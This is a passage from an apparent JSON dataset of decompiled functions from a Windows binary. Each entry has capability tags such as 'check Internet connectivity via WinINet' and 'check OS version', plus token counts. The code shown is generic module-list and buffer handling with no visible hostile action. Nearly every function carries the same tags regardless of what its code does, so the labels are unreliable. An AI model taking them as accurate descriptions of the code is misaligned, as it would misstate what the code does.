        "decompiled_code": "\nuint __cdecl fcn.00029cd0(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint arg_8h;\n    char *arg_ch;\n    uint var_24h;\n    uint var_1ch;\n    char *var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = fcn.00020a80(arg_10h, 0x13, 3, &var_8h, 4);\n    if (iVar2 == 0) {\n        var_10h = 0x21590065;\n    }\n    else {\n        iVar2 = fcn.00020a10(arg_10h, 0x14, 4, &var_4h, &var_ch);\n        if (iVar2 == 0) {\n            var_10h = 0x21590066;\n        }\n        else {\n            arg_8h = fcn.00037980(var_4h);\n            arg_ch = fcn.000356c0(arg_8h);\n            if (arg_ch == NULL) {\n                var_10h = 0x21590004;\n            }\n            else {\n                fcn.00037900(var_4h, arg_ch, 0xffffffff);\n                var_18h = arg_ch;\n                do {\n                    cVar1 = *var_18h;\n                    var_18h = var_18h + 1;\n                } while (cVar1 != '\\0');\n                iVar2 = fcn.000296f0(var_8h, arg_ch, var_18h + (1 - (arg_ch + 1)));\n                if (iVar2 == 0) {\n                    var_10h = 0;\n                }\n                else {\n                    var_10h = 0x215901fb;\n                }\n                fcn.000357f0(arg_ch);\n            }\n        }\n    }\n    return var_10h;\n}\n",
        "token_count": 460
    },
    "00029e40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00029e40(uint noname_0, uint noname_1, uint noname_2, uint *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    uint var_28h;\n    uint32_t var_24h;\n    int32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint *var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_20h = 0;\n    *arg_14h = 3;\n    var_14h = fcn.000238f0(0xfffffffe, 4, &var_1ch, &var_20h);\n    if (var_14h == 0) {\n        var_ch = NULL;\n        var_8h = 0;\n        var_4h = 0;\n        var_10h = 7;\n        var_ch = fcn.000357b0(7, 8);\n        if (var_ch == NULL) {\n            var_24h = 0x21590004;\n        }\n        else {\n            *var_ch = 1;\n            var_ch[1] = 8;\n            var_ch[2] = 0xe;\n            var_ch[3] = 3;\n            var_ch[4] = 2;\n            var_ch[5] = 7;\n            var_ch[6] = 3;\n            var_ch[7] = 7;\n            var_ch[8] = 4;\n            var_ch[9] = 2;\n            var_ch[10] = 0xf;\n            var_ch[0xb] = 2;\n            var_ch[0xc] = 5;\n            var_ch[0xd] = 2;\n            var_8h = var_1ch;\n            var_4h = fcn.000357b0(var_1ch, 4);\n            if (var_4h == 0) {\n                var_24h = 0x21590004;\n            }\n            else {\n                for (var_18h = 0; var_18h < var_8h; var_18h = var_18h + 1) {\n                    uVar1 = fcn.000357b0(var_10h, 0x10);\n                    *(var_4h + var_18h * 4) = uVar1;\n                    if (*(var_4h + var_18h * 4) == 0) {\n                        var_24h = 0x21590004;\n                        goto code_r0x0002a414;\n                    }\n                    *(*(var_4h + var_18h * 4) + 4) = *(var_4h + var_18h * 4) + 8;\n                    **(var_4h + var_18h * 4) = 4;\n                    **(*(var_4h + var_18h * 4) + 4) = *(var_20h + 0x20 + var_18h * 0x40);\n                    *(*(var_4h + var_18h * 4) + 0x14) = *(var_4h + var_18h * 4) + 0x18;\n                    *(*(var_4h + var_18h * 4) + 0x10) = 4;\n                    **(*(var_4h + var_18h * 4) + 0x14) = *(var_20h + 0x10 + var_18h * 0x40);\n                    *(*(var_4h + var_18h * 4) + 0x24) = *(var_4h + var_18h * 4) + 0x28;\n                    *(*(var_4h + var_18h * 4) + 0x20) = 4;\n                    **(*(var_4h + var_18h * 4) + 0x24) = *(var_20h + 0x18 + var_18h * 0x40);\n                    *(*(var_4h + var_18h * 4) + 0x34) = *(var_4h + var_18h * 4) + 0x38;\n                    *(*(var_4h + var_18h * 4) + 0x30) = 4;\n                    **(*(var_4h + var_18h * 4) + 0x34) = *(var_20h + 0x14 + var_18h * 0x40);\n                    if ((*(var_20h + 0xc + var_18h * 0x40) & 0x80000000) == 0) {\n                        *(*(var_4h + var_18h * 4) + 0x44) = *(var_4h + var_18h * 4) + 0x48;\n                        *(*(var_4h + var_18h * 4) + 0x40) = 4;\n                        **(*(var_4h + var_18h * 4) + 0x44) = *(var_20h + 0xc + var_18h * 0x40);\n                    }\n                    else {\n                        *(*(var_4h + var_18h * 4) + 0x44) = *(var_4h + var_18h * 4) + 0x48;\n                        *(*(var_4h + var_18h * 4) + 0x40) = 4;\n                        **(*(var_4h + var_18h * 4) + 0x44) = 0;\n                    }\n                    *(*(var_4h + var_18h * 4) + 0x54) = *(var_4h + var_18h * 4) + 0x58;\n                    *(*(var_4h + var_18h * 4) + 0x50) = 4;\n                    **(*(var_4h + var_18h * 4) + 0x54) = *(var_20h + 0x1c + var_18h * 0x40);\n                    if ((*(var_20h + 0xc + var_18h * 0x40) & 0x80000000) == 0) {\n                        *(*(var_4h + var_18h * 4) + 100) = *(var_4h + var_18h * 4) + 0x68;\n                        *(*(var_4h + var_18h * 4) + 0x60) = 4;\n                        **(*(var_4h + var_18h * 4) + 100) = 0;\n                    }\n                    else {\n                        *(*(var_4h + var_18h * 4) + 100) = *(var_4h + var_18h * 4) + 0x68;\n                        *(*(var_4h + var_18h * 4) + 0x60) = 4;\n                        **(*(var_4h + var_18h * 4) + 100) = *(var_20h + 0xc + var_18h * 0x40) & 0x7fffffff;\n                    }\n                }\n                var_24h = fcn.0002f2c0(&var_10h, arg_18h, arg_1ch);\n            }\n        }\ncode_r0x0002a414:\n        if (var_4h != 0) {\n            for (var_18h = 0; var_18h < var_8h; var_18h = var_18h + 1) {\n                fcn.000357f0(*(var_4h + var_18h * 4));\n            }\n        }\n        fcn.000357f0(var_ch);\n        fcn.000357f0(var_4h);\n        fcn.000357f0(var_20h);\n    }\n    else {\n        var_24h = var_14h + 0x191U | 0x21590000;\n    }\n    return var_24h;\n}\n",
        "token_count": 1859
    },
    "0002a4c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002a4c0(uint arg_8h, int32_t *arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint var_1a0h;\n    int32_t var_19ch;\n    int32_t var_198h;\n    int32_t *var_194h;\n    int32_t *var_190h;\n    uint32_t var_18ch;\n    uint var_188h;\n    uint var_180h;\n    int32_t *var_17ch;\n    uint var_178h;\n    uint var_170h;\n    int32_t *var_16ch;\n    uint var_168h;\n    uint var_164h;\n    int32_t var_158h;\n    int32_t var_154h;\n    uint32_t var_124h;\n    uint var_120h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_1ch = 0x100;\n    var_18h = fcn.00029500(7, arg_8h, &var_120h, 0x100, &var_1ch, 0);\n    var_14h = 0;\n    var_ch = 0;\n    var_8h = 0;\n    var_10h = 1;\n    var_16ch = arg_ch;\n    do {\n        uVar1 = *var_16ch;\n        var_16ch = var_16ch + 1;\n    } while (uVar1 != 0);\n    iVar2 = fcn.00029710(7, arg_8h, arg_ch, var_16ch + (1 - (arg_ch + 1)), &var_14h, 1);\n    if (iVar2 != 0) {\n        return;\n    }\n    iVar2 = fcn.00023930(0xfffffffe, 7, &arg_8h, &var_168h);\n    if (iVar2 != 0) {\n        return;\n    }\n    fcn.00023b50(0xfffffffe, 7, var_164h, 0, var_158h + 1);\n    if (var_18h != 0) {\n        return;\n    }\n    var_4h = fcn.00078ace(&var_120h, 0x3a);\n    if (var_4h == 0) {\n        return;\n    }\n    var_124h = var_4h - &var_120h;\n    var_17ch = arg_ch;\n    do {\n        uVar1 = *var_17ch;\n        var_17ch = var_17ch + 1;\n    } while (uVar1 != 0);\n    if (((var_17ch - (arg_ch + 1) <= var_124h) || (*(arg_ch + var_124h) != 0x3a)) || (var_124h == 0))\n    goto code_r0x0002a7f6;\n    var_190h = &var_120h;\n    var_194h = arg_ch;\n    for (var_18ch = var_124h - 1; 3 < var_18ch; var_18ch = var_18ch - 4) {\n        if (*var_194h != *var_190h) goto code_r0x0002a6c4;\n        var_190h = var_190h + 1;\n        var_194h = var_194h + 1;\n    }\n    if (var_18ch == 0) {\ncode_r0x0002a79a:\n        var_19ch = 0;\n    }\n    else {\ncode_r0x0002a6c4:\n        var_198h = *var_194h - *var_190h;\n        if (var_198h == 0) {\n            if (var_18ch == 1) goto code_r0x0002a79a;\n            var_198h = *(var_194h + 1) - *(var_190h + 1);\n            if (var_198h == 0) {\n                if (var_18ch == 2) goto code_r0x0002a79a;\n                var_198h = *(var_194h + 2) - *(var_190h + 2);\n                if (var_198h == 0) {\n                    if ((var_18ch == 3) || (var_198h = *(var_194h + 3) - *(var_190h + 3),  var_198h == 0))\n                    goto code_r0x0002a79a;\n                }\n            }\n        }\n        var_19ch = 1;\n        if (var_198h < 1) {\n            var_19ch = -1;\n        }\n    }\n    if (var_19ch == 0) {\n        fcn.00023b50(0xfffffffe, 7, var_164h, 1, var_154h + 1);\n        return;\n    }\ncode_r0x0002a7f6:\n    fcn.00023b50(0xfffffffe, 7, var_164h, 1, 1);\n    return;\n}\n",
        "token_count": 1199
    },
    "0002a850": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_158h\n\nuint32_t __cdecl fcn.0002a850(uint noname_0, uint noname_1, uint noname_2, uint *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint var_158h;\n    uint var_150h;\n    uint *var_14ch;\n    uint var_144h;\n    char *var_140h;\n    uint *var_13ch;\n    uint var_138h;\n    uint var_130h;\n    uint *var_12ch;\n    uint var_128h;\n    uint32_t var_28h;\n    int32_t var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint *var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_24h = 0;\n    *arg_14h = 3;\n    var_14h = fcn.000238f0(0xfffffffe, 7, &var_20h, &var_24h);\n    if (var_14h == 0) {\n        var_ch = NULL;\n        var_4h = 0;\n        var_10h = 6;\n        var_8h = var_20h;\n        var_ch = fcn.000357b0(6, 8);\n        if (var_ch == NULL) {\n            var_28h = 0x21590004;\n        }\n        else {\n            *var_ch = 5;\n            var_ch[1] = 2;\n            var_ch[2] = 0x1c;\n            var_ch[3] = 200;\n            var_ch[4] = 0x1d;\n            var_ch[5] = 2;\n            var_ch[6] = 0x1e;\n            var_ch[7] = 2;\n            var_ch[8] = 1;\n            var_ch[9] = 8;\n            var_ch[10] = 0x5f;\n            var_ch[0xb] = 2;\n            var_4h = fcn.000357b0(var_8h, 4);\n            if (var_4h == 0) {\n                var_28h = 0x21590004;\n            }\n            else {\n                for (var_18h = 0; var_18h < var_20h; var_18h = var_18h + 1) {\n                    var_14h = fcn.00029500(7, *(var_24h + 4 + var_18h * 0x40), &var_128h, 0x100, &var_1ch, 1);\n                    if (var_14h != 0) {\n                        var_128h._0_1_ = 0;\n                    }\n                    var_12ch = &var_128h;\n                    do {\n                        cVar1 = *var_12ch;\n                        var_12ch = var_12ch + 1;\n                    } while (cVar1 != '\\0');\n                    uVar2 = fcn.000356c0(var_12ch + ((var_10h * 0x10 + 1) - (&var_128h + 1)));\n                    *(var_4h + var_18h * 4) = uVar2;\n                    if (*(var_4h + var_18h * 4) == 0) {\n                        var_28h = 0x21590004;\n                        goto code_r0x0002acc8;\n                    }\n                    fcn.00078bfa(*(var_4h + var_18h * 4), 0, var_10h << 4);\n                    *(*(var_4h + var_18h * 4) + 4) = *(var_4h + var_18h * 4) + 8;\n                    **(var_4h + var_18h * 4) = 4;\n                    **(*(var_4h + var_18h * 4) + 4) = *(var_24h + 0xc + var_18h * 0x40);\n                    var_13ch = &var_128h;\n                    var_140h = var_10h * 0x10 + *(var_4h + var_18h * 4);\n                    do {\n                        cVar1 = *var_13ch;\n                        *var_140h = cVar1;\n                        var_13ch = var_13ch + 1;\n                        var_140h = var_140h + 1;\n                    } while (cVar1 != '\\0');\n                    *(*(var_4h + var_18h * 4) + 0x14) = var_10h * 0x10 + *(var_4h + var_18h * 4);\n                    var_14ch = &var_128h;\n                    do {\n                        cVar1 = *var_14ch;\n                        var_14ch = var_14ch + 1;\n                    } while (cVar1 != '\\0');\n                    *(*(var_4h + var_18h * 4) + 0x10) = var_14ch + (1 - (&var_128h + 1));\n                    *(*(var_4h + var_18h * 4) + 0x24) = *(var_4h + var_18h * 4) + 0x28;\n                    *(*(var_4h + var_18h * 4) + 0x20) = 4;\n                    **(*(var_4h + var_18h * 4) + 0x24) = *(var_24h + 0x10 + var_18h * 0x40);\n                    *(*(var_4h + var_18h * 4) + 0x34) = *(var_4h + var_18h * 4) + 0x38;\n                    *(*(var_4h + var_18h * 4) + 0x30) = 4;\n                    **(*(var_4h + var_18h * 4) + 0x34) = *(var_24h + 0x14 + var_18h * 0x40);\n                    *(*(var_4h + var_18h * 4) + 0x44) = *(var_4h + var_18h * 4) + 0x48;\n                    *(*(var_4h + var_18h * 4) + 0x40) = 4;\n                    **(*(var_4h + var_18h * 4) + 0x44) = *(var_24h + 0x28 + var_18h * 0x40);\n                    *(*(var_4h + var_18h * 4) + 0x54) = *(var_4h + var_18h * 4) + 0x58;\n                    *(*(var_4h + var_18h * 4) + 0x50) = 4;\n                    **(*(var_4h + var_18h * 4) + 0x54) = *(var_24h + 0x18 + var_18h * 0x40);\n                }\n                var_28h = fcn.0002f2c0(&var_10h, arg_18h, arg_1ch);\n            }\n        }\ncode_r0x0002acc8:\n        if (var_4h != 0) {\n            for (var_18h = 0; var_18h < var_8h; var_18h = var_18h + 1) {\n                fcn.000357f0(*(var_4h + var_18h * 4));\n            }\n            fcn.000357f0(var_4h);\n        }\n        fcn.000357f0(var_ch);\n        fcn.00023b90(var_24h);\n    }\n    else {\n        var_28h = var_14h + 0x191U | 0x21590000;\n    }\n    return var_28h;\n}\n",
        "token_count": 1864
    },
    "0002ad30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0002ad30(uint noname_0, uint noname_1, uint noname_2, uint *arg_14h)\n\n{\n    uint32_t uVar1;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    *arg_14h = 0;\n    var_4h = fcn.000238f0(0xfffffffe, 7, &var_8h, &var_ch);\n    if (var_4h == 0) {\n        fcn.00023ab0(var_ch, var_8h);\n        fcn.00023b90(var_ch);\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = var_4h + 0x191U | 0x21590000;\n    }\n    return uVar1;\n}\n",
        "token_count": 194
    },
    "0002ad90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0002ad90(void)\n\n{\n    int32_t iVar1;\n    uint var_114h;\n    int32_t var_110h;\n    uint var_10ch;\n    uint var_108h;\n    \n    fcn.00036ed0(0x800cd238);\n    *0x800cd250 = fcn.0001d840();\n    *0x800cd24c = 0x800dba20;\n    *0x800cd248 = 0x800dba20;\n    fcn.0003cf40(*0x800dba24, 0x800dbb34);\n    fcn.00036ed0(0x800db890);\n    fcn.0002b540(0, 0, 0, 0, 0, 0, 0);\n    for (var_110h = 500; var_110h < 0x227; var_110h = var_110h + 1) {\n        iVar1 = fcn.000294e0(var_110h, &var_108h, 0x104, &var_10ch);\n        if ((iVar1 == 0) && (var_108h != '\\0')) {\n            fcn.000296f0(var_110h, 0x800545f4, 8);\n            iVar1 = fcn.0002afd0(&var_108h, 0);\n            fcn.00043cb0(2000);\n            fcn.000296f0(var_110h, &var_108h, var_10ch);\n            if ((iVar1 != 0) && (iVar1 != 0x21590206)) {\n                fcn.00029dc0(0xd, iVar1, 0, 0, 0xbb9aca00);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 417
    },
    "0002aed0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0002aed0(void)\n\n{\n    uint *puVar1;\n    uint var_8h;\n    uint *var_4h;\n    \n    fcn.00037100(0x800cd238);\n    var_4h = **0x800cd24c;\n    while (var_4h != NULL) {\n        puVar1 = *var_4h;\n        if (var_4h[0x44] != 0) {\n            (*var_4h[0x44])();\n        }\n        fcn.0002b680(var_4h);\n        fcn.000357f0(var_4h);\n        var_4h = puVar1;\n    }\n    **0x800cd24c = 0;\n    *0x800cd24c = NULL;\n    *0x800cd248 = 0;\n    fcn.0003cf40(*0x800dba24, 0x800dbb34);\n    fcn.00037190(0x800cd238);\n    fcn.00036f40(0x800cd238);\n    if (*0x800cd114 != 0) {\n        fcn.00037100(0x800db890);\n        fcn.0002b680(0x800cd110);\n        *0x800cd114 = 0;\n        *0x800ce698 = 0;\n        *0x800ce69c = 0;\n        fcn.00037190(0x800db890);\n    }\n    fcn.00036f40(0x800db890);\n    return;\n}\n",
        "token_count": 351
    },
    "0002afd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0002afd0(char *arg_8h, int32_t arg_ch)\n\n{\n    int32_t *arg_8h_00;\n    int32_t iVar1;\n    uint var_14h;\n    int32_t var_10h;\n    code *var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    var_8h = 0xffffffff;\n    fcn.00036f70(0x800cd238);\n    for (var_4h = *0x800cd24c; var_4h != NULL; var_4h = *var_4h) {\n        fcn.0003cf40();\n    }\n    fcn.00037020(0x800cd238);\n    fcn.0003cf40(*0x800ce690, 0x800ce694);\n    arg_8h_00 = fcn.000356c0(0x128);\n    if (arg_8h_00 == NULL) {\n        var_10h = fcn.00035ae0();\n    }\n    else {\n        fcn.00078bfa(arg_8h_00, 0, 0x128);\n        if (arg_ch == 0) {\n            if (*arg_8h == '&') {\n                var_10h = fcn.0002b840(arg_8h, arg_8h_00);\n            }\n            else {\n                var_10h = fcn.0002b730(arg_8h_00, arg_8h);\n            }\n        }\n        else {\n            var_10h = fcn.0002b6e0(arg_8h_00, arg_ch, arg_8h, arg_8h);\n        }\n        if (var_10h == 0) {\n            fcn.00078ac8(arg_8h_00 + 2, arg_8h, 0x104);\n            *(arg_8h_00 + 0x10b) = 0;\n            fcn.00036f70(0x800cd238);\n            var_4h = *0x800cd24c;\n            while (((var_4h != NULL && (var_4h[1] != arg_8h_00[1])) &&\n                   (iVar1 = fcn.00078a92(var_4h + 2, arg_8h_00 + 2),  iVar1 != 0))) {\n                var_4h = *var_4h;\n            }\n            fcn.00037020(0x800cd238);\n            if (var_4h == NULL) {\n                var_10h = fcn.0002b970(arg_8h_00, 0x8005169c, &var_ch);\n                if (var_10h == 0) {\n                    fcn.0002b970(arg_8h_00, 0x800545fc, arg_8h_00 + 0x43);\n                    fcn.0002b970(arg_8h_00, 0x800516a8, arg_8h_00 + 0x44);\n                    var_10h = (*var_ch)(*0x800cd24c);\n                    if (var_10h == 0) {\n                        fcn.00037100(0x800cd238);\n                        **0x800cd248 = arg_8h_00;\n                        *0x800cd248 = arg_8h_00;\n                        fcn.00037190(0x800cd238);\n                        var_10h = 0;\n                    }\n                }\n            }\n            else {\n                var_10h = 0x215901fc;\n            }\n        }\n    }\n    if (var_10h != 0) {\n        fcn.0002b680(arg_8h_00);\n        fcn.000357f0(arg_8h_00);\n    }\n    fcn.00036f70(0x800cd238);\n    for (var_4h = *0x800cd24c; var_4h != NULL; var_4h = *var_4h) {\n        fcn.0003cf40();\n    }\n    fcn.00037020(0x800cd238);\n    return var_10h;\n}\n",
        "token_count": 944
    },
    "0002b250": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0002b250(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_10h;\n    code *var_ch;\n    uint *var_8h;\n    uint *var_4h;\n    \n    var_ch = NULL;\n    fcn.00037100(0x800cd238);\n    var_4h = *0x800cd24c;\n    var_8h = **0x800cd24c;\n    do {\n        if (var_8h == NULL) {\ncode_r0x0002b2b7:\n            if (var_8h == NULL) {\n                fcn.00037190(0x800cd238);\n                var_10h = 0x215901fd;\n            }\n            else {\n                *var_4h = *var_8h;\n                if (var_8h == *0x800cd248) {\n                    *0x800cd248 = var_4h;\n                }\n                fcn.00037190(0x800cd238);\n                if (var_ch == NULL) {\n                    var_10h = 0x215901fe;\n                }\n                else {\n                    (*var_ch)();\n                    var_10h = 0;\n                }\n                fcn.0002b680(var_8h);\n                fcn.000357f0(var_8h);\n            }\n            return var_10h;\n        }\n        iVar1 = fcn.00078a92(var_8h + 2, arg_8h);\n        if (iVar1 == 0) {\n            var_ch = var_8h[0x44];\n            goto code_r0x0002b2b7;\n        }\n        var_4h = var_8h;\n        var_8h = *var_8h;\n    } while( true );\n}\n",
        "token_count": 401
    },
    "0002b3f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl\nfcn.0002b3f0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t var_8h;\n    uint *var_4h;\n    \n    var_8h = (*(*0x800cd24c)[0x43])(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, 0x21590001);\n    if (var_8h == 0x21590001) {\n        fcn.00036f70(0x800cd238);\n        var_4h = **0x800cd24c;\n        while ((var_4h != NULL &&\n               ((var_4h[0x43] == 0 ||\n                (var_8h = (*var_4h[0x43])(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h), \n                var_8h == 0x21590001))))) {\n            var_4h = *var_4h;\n        }\n        fcn.00037020(0x800cd238);\n    }\n    return var_8h;\n}\n",
        "token_count": 323
    },
    "0002b540": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0002b540(void)\n\n{\n    int32_t iVar1;\n    uint var_118h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    iVar1 = fcn.000294e0(0x22a, &var_118h, 0x104, &var_4h);\n    if (iVar1 == 0) {\n        fcn.00037100(0x800db890);\n        var_8h = 1;\n        if (*0x800cd114 != 0) {\n            fcn.0002b680(0x800cd110);\n            *0x800ce698 = 0;\n            *0x800ce69c = 0;\n        }\n        if (var_118h == '&') {\n            var_ch = fcn.0002b840(&var_118h, 0x800cd110);\n        }\n        else {\n            var_ch = fcn.0002b730(0x800cd110, &var_118h);\n        }\n        if (((var_ch == 0) && (var_ch = fcn.0002b970(0x800cd110, 0x8005460c, 0x800ce698),  var_ch == 0)) &&\n           (var_ch = fcn.0002b970(0x800cd110, 0x80054618, 0x800ce69c),  var_ch == 0)) {\n            var_ch = 0;\n        }\n    }\n    else {\n        var_ch = 0x21590065;\n    }\n    if (var_ch != 0) {\n        *0x800ce698 = 0;\n        *0x800ce69c = 0;\n        fcn.0002b680(0x800cd110);\n    }\n    if (var_8h != 0) {\n        fcn.00037190(0x800db890);\n    }\n    return var_ch;\n}\n",
        "token_count": 461
    },
    "0002b680": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002b680(int32_t arg_8h)\n\n{\n    fcn.0003cf40(*(arg_8h + 4), arg_8h + 0x114);\n    if (((arg_8h != 0) && (*(arg_8h + 4) != 0)) && (*(arg_8h + 0x118) != 0)) {\n        fcn.0005de60(*(arg_8h + 0x11c), *(arg_8h + 4), 1);\n    }\n    return;\n}\n",
        "token_count": 127
    },
    "0002b840": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0002b840(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t arg_10h;\n    uint uVar1;\n    uint32_t var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_8h = fcn.00036370(arg_8h + 1, 0, 0);\n    var_4h = fcn.00029500(3, var_8h, 0, 0, &var_54h, 0);\n    if (var_4h == 0) {\n        arg_10h = fcn.000356c0(var_54h);\n        if (arg_10h == 0) {\n            var_5ch = 0x21590004;\n        }\n        else {\n            var_4h = fcn.00029500(3, var_8h, arg_10h, var_54h, &var_54h, 0);\n            if (var_4h == 0) {\n                var_50h._0_2_ = 0x26;\n                fcn.00078ada(var_8h, &var_50h + 2, 10);\n                *(arg_ch + 0x118) = 1;\n                uVar1 = fcn.0001d840(arg_10h, &var_50h, &var_50h, arg_ch + 4);\n                var_5ch = fcn.0005d210(uVar1);\n            }\n            else {\n                var_5ch = var_4h + 0x191U | 0x21590000;\n            }\n            fcn.000357f0(arg_10h);\n            uVar1 = fcn.0001d840();\n            *(arg_ch + 0x11c) = uVar1;\n            if (var_5ch != 0) {\n                *(arg_ch + 4) = 0;\n            }\n        }\n    }\n    else {\n        var_5ch = var_4h + 0x191U | 0x21590000;\n    }\n    return var_5ch;\n}\n",
        "token_count": 518
    },
    "0002c480": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0002c480(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t var_4h;\n    \n    var_4h = fcn.00078ac2(arg_8h, arg_ch, arg_10h, arg_14h);\n    if (var_4h < 0) {\n        *(arg_8h + arg_ch + -1) = 0;\n        var_4h = arg_ch << 1;\n    }\n    return var_4h;\n}\n",
        "token_count": 132
    },
    "0002c540": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
